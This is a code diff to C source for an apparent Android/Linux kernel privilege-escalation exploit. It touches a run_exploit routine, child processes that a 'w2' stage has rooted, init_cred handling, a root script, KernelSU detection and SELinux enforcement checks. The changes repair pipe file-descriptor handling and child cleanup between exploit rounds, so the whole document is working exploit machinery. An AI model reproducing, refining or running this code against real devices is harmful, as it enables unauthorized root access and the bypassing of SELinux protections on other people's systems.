@@ -842,13 +842,16 @@ static void child_main(struct child_pipes *p) {
         ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
       write(p->uid_w, &report, sizeof(report));
     }
-    else if (cmd == 'P') {
+    else if (cmd == 'P' || (cmd == 'X' && getuid() == 0)) {
       /* w2 rooted this task; park */
       close(p->cmd_r);
       close(p->uid_w);
       park_rooted_child();
     }
-    else if (cmd == 'G' || cmd == 'X') break;
+    else if (cmd == 'G') break;
+    /* X retires a task w2 rooted without starting the root script. a rooted
+     * exit drops the init_cred ref w2 never took, so it parks above. */
+    else if (cmd == 'X') _exit(1);
   }
   close(p->cmd_r);
   if (getuid() != 0) { close(p->uid_w); _exit(1); }
@@ -885,7 +888,7 @@ static int raise_pipe_fd(int fd) {
   int high = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 96);
   if (high < 0) {
     pr_warning("pipe fd raise failed fd=%d errno=%d\n", fd, errno);
-    return fd;
+    return -1;
   }
   close(fd);
   return high;
@@ -894,9 +897,13 @@ static int raise_pipe_fd(int fd) {
 static pid_t spawn_child(struct child_pipes *p) {
   int p1[2], p2[2], p3[2];
   if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
-  p->task_r = raise_pipe_fd(p1[0]); p->task_w = raise_pipe_fd(p1[1]);
-  p->cmd_r = raise_pipe_fd(p2[0]); p->cmd_w = raise_pipe_fd(p2[1]);
-  p->uid_r = raise_pipe_fd(p3[0]); p->uid_w = raise_pipe_fd(p3[1]);
+  int *raised[6] = {&p->task_r, &p->task_w, &p->cmd_r,
+                    &p->cmd_w,  &p->uid_r,  &p->uid_w};
+  int *raw[6] = {&p1[0], &p1[1], &p2[0], &p2[1], &p3[0], &p3[1]};
+  for (int i = 0; i < 6; i++) {
+    *raised[i] = raise_pipe_fd(*raw[i]);
+    if (*raised[i] < 0) return -1;
+  }
   pid_t child = fork();
   if (child < 0) return -1;
   if (child == 0) { child_main(p); _exit(1); }
@@ -1211,9 +1218,9 @@ int run_exploit(int argc, char **argv) {
               verify_leaf_dir_stage, &w3_context, 1)) {
         if (child_alive) {
           write(pipes.cmd_w, "X", 1);
-          close(pipes.cmd_w);
-          close(pipes.uid_r);
           waitpid(child, NULL, WNOHANG);
+          /* the next round takes over the pipe fds */
+          child_alive = 0;
         }
         pr_warning("W3 leaf direction probe failed; not writing blind\n");
         continue;
@@ -1315,7 +1322,7 @@ int run_exploit(int argc, char **argv) {
   }
   kernelsu_ready = kernelsu_ready || ksu_log_loaded;
   /* enforcing takes the app dir away from the root script, so its log stops
-   * before the restore. read the state here instead. */
+   * before the restore. the state has to be read from here. */
   int enforced = 0;
   for (int i = 0; i < 20 && !(enforced = !check_selinux_off()); i++)
     usleep(500000);
